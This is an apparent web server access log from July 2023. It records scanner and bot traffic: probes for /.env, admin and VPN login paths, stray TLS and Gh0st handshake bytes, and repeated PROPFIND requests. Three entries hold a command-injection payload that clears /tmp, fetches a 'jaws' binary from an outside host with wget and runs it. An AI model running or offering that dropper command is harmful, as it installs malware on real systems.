92.118.39.40 - - [18/Jul/2023:23:31:26 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.104.11.46 - - [18/Jul/2023:23:49:13 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [19/Jul/2023:00:15:35 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.79.29.48 - - [19/Jul/2023:00:52:07 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:00:52:07 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
94.230.151.112 - - [19/Jul/2023:01:02:42 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:01:19:09 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.79.29.48 - - [19/Jul/2023:01:32:50 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:01:32:51 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
207.90.244.10 - - [19/Jul/2023:01:36:27 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
207.90.244.10 - - [19/Jul/2023:01:36:28 +0000] "GET /robots.txt HTTP/1.1" 404 437 "-" "-"
207.90.244.10 - - [19/Jul/2023:01:36:28 +0000] "GET /sitemap.xml HTTP/1.1" 404 437 "-" "-"
207.90.244.10 - - [19/Jul/2023:01:36:29 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 437 "-" "-"
207.90.244.10 - - [19/Jul/2023:01:36:30 +0000] "GET /favicon.ico HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
41.43.178.100 - - [19/Jul/2023:01:47:31 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ testbots.maizhangyu.top/jaws;sh+/tmp/jaws" 400 488 "-" "-"
162.243.141.26 - - [19/Jul/2023:01:51:55 +0000] "GET /portal/redlion HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
143.110.222.166 - - [19/Jul/2023:02:02:24 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
194.165.16.73 - - [19/Jul/2023:02:29:15 +0000] "\x03" 400 488 "-" "-"
68.183.44.161 - - [19/Jul/2023:02:29:35 +0000] "GET / HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
159.89.109.248 - - [19/Jul/2023:02:29:35 +0000] "POST /wsman HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
159.223.236.174 - - [19/Jul/2023:02:29:36 +0000] "GET /auth.html HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
159.223.236.174 - - [19/Jul/2023:02:29:36 +0000] "GET / HTTP/1.1" 200 2015 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
159.223.236.174 - - [19/Jul/2023:02:29:36 +0000] "GET /auth1.html HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
159.223.236.174 - - [19/Jul/2023:02:29:36 +0000] "GET /sslvpnLogin.html HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
159.223.236.174 - - [19/Jul/2023:02:29:36 +0000] "GET /api/sonicos/auth HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
159.223.236.174 - - [19/Jul/2023:02:29:36 +0000] "GET /api/sonicos/tfa HTTP/1.1" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
143.110.231.143 - - [19/Jul/2023:02:31:30 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
143.110.231.143 - - [19/Jul/2023:02:31:30 +0000] "GET /favicon.ico HTTP/1.1" 404 492 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
178.62.69.246 - - [19/Jul/2023:02:33:53 +0000] "GET / HTTP/1.0" 200 5393 "-" "-"
178.62.69.246 - - [19/Jul/2023:02:33:54 +0000] "Gh0st\xad" 400 488 "-" "-"
178.62.69.246 - - [19/Jul/2023:02:33:58 +0000] "HELP" 400 488 "-" "-"
178.62.69.246 - - [19/Jul/2023:02:33:58 +0000] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 488 "-" "-"
178.62.69.246 - - [19/Jul/2023:02:34:00 +0000] "\x16\x03\x01" 400 488 "-" "-"
178.62.69.246 - - [19/Jul/2023:02:34:02 +0000] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xffx\\d9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 488 "-" "-"
134.122.40.26 - - [19/Jul/2023:02:34:22 +0000] "GET / HTTP/1.0" 200 5393 "-" "-"
51.79.29.48 - - [19/Jul/2023:02:45:26 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:02:45:26 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.128.95.222 - - [19/Jul/2023:03:00:57 +0000] "GET /aaa9 HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
178.128.95.222 - - [19/Jul/2023:03:01:08 +0000] "GET /aab8 HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
178.128.95.222 - - [19/Jul/2023:03:01:17 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 zgrab/0.x"
45.79.181.179 - - [19/Jul/2023:03:08:52 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [19/Jul/2023:03:10:23 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
18.183.63.107 - - [19/Jul/2023:03:26:30 +0000] "GET /config HTTP/1.1" 404 493 "-" "python-requests/2.22.0"
66.240.205.34 - - [19/Jul/2023:03:32:42 +0000] "Gh0st\xad" 400 488 "-" "-"
45.128.232.176 - - [19/Jul/2023:03:34:25 +0000] "CONNECT google.com:443 HTTP/1.1" 200 5374 "-" "Go-http-client/1.1"
45.128.232.176 - - [19/Jul/2023:03:34:26 +0000] "\x16\x03\x01" 400 0 "-" "-"
45.79.181.104 - - [19/Jul/2023:03:56:32 +0000] "\x16\x03\x01" 400 488 "-" "-"
139.59.58.140 - - [19/Jul/2023:03:56:35 +0000] "GET /aaa9 HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
139.59.58.140 - - [19/Jul/2023:03:56:44 +0000] "GET /aab8 HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
139.59.58.140 - - [19/Jul/2023:03:56:52 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 zgrab/0.x"
193.106.29.122 - - [19/Jul/2023:04:14:16 +0000] "GET / HTTP/1.0" 200 5393 "-" "Mozilla/5.0"
174.138.60.159 - - [19/Jul/2023:04:17:37 +0000] "\x16\x03\x01" 400 488 "-" "-"
174.138.60.159 - - [19/Jul/2023:04:17:37 +0000] "GET /files/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:04:22:10 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
184.105.139.68 - - [19/Jul/2023:04:43:35 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
184.105.139.68 - - [19/Jul/2023:04:46:33 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
184.105.139.68 - - [19/Jul/2023:04:47:25 +0000] "GET /geoserver/web/ HTTP/1.1" 404 437 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:04:58:39 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:04:58:39 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
103.88.232.54 - - [19/Jul/2023:05:00:31 +0000] "CONNECT google.com:443 HTTP/1.1" 200 5374 "-" "Go-http-client/1.1"
103.88.232.54 - - [19/Jul/2023:05:00:31 +0000] "\x16\x03\x01" 400 488 "-" "-"
45.4.138.114 - - [19/Jul/2023:05:04:12 +0000] "GET / HTTP/1.1" 200 5393 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0"
143.110.222.166 - - [19/Jul/2023:05:16:05 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
162.243.150.15 - - [19/Jul/2023:05:32:09 +0000] "GET /manager/html HTTP/1.1" 404 437 "-" "Mozilla/5.0 zgrab/0.x"
51.79.29.48 - - [19/Jul/2023:05:43:08 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:05:43:08 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.11.34 - - [19/Jul/2023:05:49:13 +0000] "\x16\x03\x01" 400 488 "-" "-"
205.210.31.200 - - [19/Jul/2023:05:54:01 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [19/Jul/2023:06:09:27 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
110.153.78.147 - - [19/Jul/2023:06:21:16 +0000] "POST /HNAP1/ HTTP/1.0" 408 487 "-" "-"
104.199.31.214 - - [19/Jul/2023:06:35:24 +0000] "GET / HTTP/1.1" 200 2052 "-" "python-requests/2.31.0"
205.210.31.59 - - [19/Jul/2023:06:38:08 +0000] "GET / HTTP/1.1" 200 5374 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
51.79.29.48 - - [19/Jul/2023:06:45:50 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:06:45:50 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
35.203.210.241 - - [19/Jul/2023:07:19:03 +0000] "GET / HTTP/1.1" 200 5374 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
143.110.222.166 - - [19/Jul/2023:07:19:34 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
109.237.97.180 - - [19/Jul/2023:07:29:53 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.97.180 - - [19/Jul/2023:07:29:53 +0000] "\x16\x03\x01\x01H\x01" 400 488 "-" "-"
91.224.92.16 - - [19/Jul/2023:07:35:48 +0000] "GET / HTTP/1.1" 200 5374 "-" "-"
192.155.90.220 - - [19/Jul/2023:07:51:07 +0000] "\x16\x03\x01" 400 488 "-" "-"
51.79.29.48 - - [19/Jul/2023:08:01:38 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:08:01:39 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
92.118.39.40 - - [19/Jul/2023:08:11:19 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
143.110.222.166 - - [19/Jul/2023:08:19:48 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
109.237.98.235 - - [19/Jul/2023:08:37:09 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
109.237.98.235 - - [19/Jul/2023:08:37:09 +0000] "\x16\x03\x01" 400 488 "-" "-"
78.29.72.89 - - [19/Jul/2023:08:40:20 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:08:40:20 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:08:40:21 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
184.105.139.68 - - [19/Jul/2023:09:13:54 +0000] "\x16\x03\x01" 400 488 "-" "-"
143.110.222.166 - - [19/Jul/2023:09:20:50 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
51.79.29.48 - - [19/Jul/2023:09:26:16 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:09:26:16 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:10:03:45 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
146.190.83.157 - - [19/Jul/2023:10:08:00 +0000] "GET /favicon.ico HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
146.190.83.157 - - [19/Jul/2023:10:08:01 +0000] "GET /1.php HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
146.190.83.157 - - [19/Jul/2023:10:08:01 +0000] "GET /bundle.js HTTP/1.1" 404 437 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:10:19:28 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:10:19:28 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.56.108.128 - - [19/Jul/2023:10:31:07 +0000] "GET /systembc/password.php HTTP/1.0" 404 456 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
2.57.122.71 - - [19/Jul/2023:10:48:18 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
2.57.122.71 - - [19/Jul/2023:10:48:18 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:11:11:25 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
192.155.90.220 - - [19/Jul/2023:11:51:12 +0000] "\x16\x03\x01" 400 488 "-" "-"
51.79.29.48 - - [19/Jul/2023:11:57:30 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
51.79.29.48 - - [19/Jul/2023:11:57:31 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
143.110.222.166 - - [19/Jul/2023:12:00:15 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
104.152.52.86 - - [19/Jul/2023:12:30:25 +0000] "GET / HTTP/1.0" 200 5393 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
143.110.190.67 - - [19/Jul/2023:12:34:05 +0000] "GET / HTTP/1.1" 200 5393 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
92.118.39.40 - - [19/Jul/2023:12:45:32 +0000] "GET / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
54.37.79.75 - - [19/Jul/2023:12:46:00 +0000] "POST / HTTP/1.1" 200 2052 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
54.37.79.75 - - [19/Jul/2023:12:46:00 +0000] "GET /.env HTTP/1.1" 404 493 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
91.224.92.16 - - [19/Jul/2023:12:48:34 +0000] "GET / HTTP/1.1" 200 5374 "-" "-"
36.37.231.34 - - [19/Jul/2023:12:49:08 +0000] "GET / HTTP/1.1" 200 5374 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
139.99.9.160 - - [19/Jul/2023:13:03:19 +0000] "GET / HTTP/1.1" 200 5393 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:58.0) Gecko/20100101 Firefox/58.0"
143.110.222.166 - - [19/Jul/2023:13:09:41 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
5.188.210.227 - - [19/Jul/2023:13:25:28 +0000] "GET http://5.188.210.227/echo.php HTTP/1.1" 404 455 "https://www.google.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
45.128.232.176 - - [19/Jul/2023:13:43:17 +0000] "CONNECT google.com:443 HTTP/1.1" 200 5374 "-" "Go-http-client/1.1"
45.128.232.176 - - [19/Jul/2023:13:43:17 +0000] "\x16\x03\x01" 400 0 "-" "-"
192.155.90.220 - - [19/Jul/2023:13:51:08 +0000] "\x16\x03\x01" 400 488 "-" "-"
156.195.28.182 - - [19/Jul/2023:14:04:16 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ testbots.maizhangyu.top/jaws;sh+/tmp/jaws" 400 488 "-" "-"
156.195.28.182 - - [19/Jul/2023:14:04:18 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ testbots.maizhangyu.top/jaws;sh+/tmp/jaws" 400 488 "-" "-"
143.110.222.166 - - [19/Jul/2023:14:08:18 +0000] "GET / HTTP/1.1" 200 1996 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 16_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1"
152.32.234.128 - - [19/Jul/2023:14:16:13 +0000] "GET / HTTP/1.1" 200 5374 "-" "-"
200.182.206.50 - - [19/Jul/2023:14:35:51 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:35:52 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:35:55 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:35:57 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:01 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:02 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:02 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:11 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:14 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:16 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:54 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:58 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:58 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:59 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:36:59 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:37:49 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:38:00 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:38:00 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:38:04 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
200.182.206.50 - - [19/Jul/2023:14:38:04 +0000] "PROPFIND /data/ HTTP/1.1" 405 561 "-" "python-requests/2.30.0"
20.5.41.140 - - [19/Jul/2023:14:58:03 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 493 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
